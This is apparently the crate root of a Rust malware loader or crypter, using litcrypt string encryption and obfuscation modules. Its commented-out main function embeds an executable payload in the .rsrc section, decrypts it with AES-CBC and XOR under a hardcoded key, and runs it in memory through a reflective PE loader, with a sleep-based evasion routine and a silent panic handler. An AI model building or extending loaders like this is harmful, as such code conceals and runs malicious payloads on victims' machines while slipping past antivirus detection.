#[macro_use]
extern crate litcrypt;
use_litcrypt!();

mod crpt;
mod obfus;
// mod runpe;
pub mod main;
pub mod misc;
extern crate alloc;

// use crpt::crypt::xor_decrypt;
// use obfus::tricks::make_sleep;
// use runpe::runpe::reflective_loader;

// use utils::deobfuscate_string;

// // #[global_allocator]
// // static ALLOCATOR: LibcAlloc = LibcAlloc;

// #[link_section = ".rsrc"]
// static DATA: &[u8] = include_bytes!("..\\payload_debug_xor_aes.exe");

// // Main function
// #[no_mangle]
// pub extern "C" fn main(_argc: isize, _argv: *const *const u8) -> isize {
//     // let now = Instant::now();

//     // make_sleep(5).expect("sleep failed");
//     // println!("{}", now.elapsed().as_secs());

//     let key = deobfuscate_string(&obfuscate_string!("kalimera freunde")); //String

//     // Convert to bytes and create key_array in one step.
//     let key_array: [u8; 16] = key
//         .as_bytes()
//         .try_into()
//         .expect("Failed to convert key into a 16 byte array");

//     let cipher = Cipher::new_128(&key_array);
//     let decrypted_aes = cipher.cbc_decrypt(&key_array, DATA);
//     let decrypted_xor = xor_decrypt(&key_array, &decrypted_aes);

//     unsafe {
//         reflective_loader(decrypted_xor.clone());
//     };

//     0
// }

// #[cfg(release)]
// #[panic_handler]
// fn my_panic(_info: &core::panic::PanicInfo) -> ! {
//     loop {}
// }
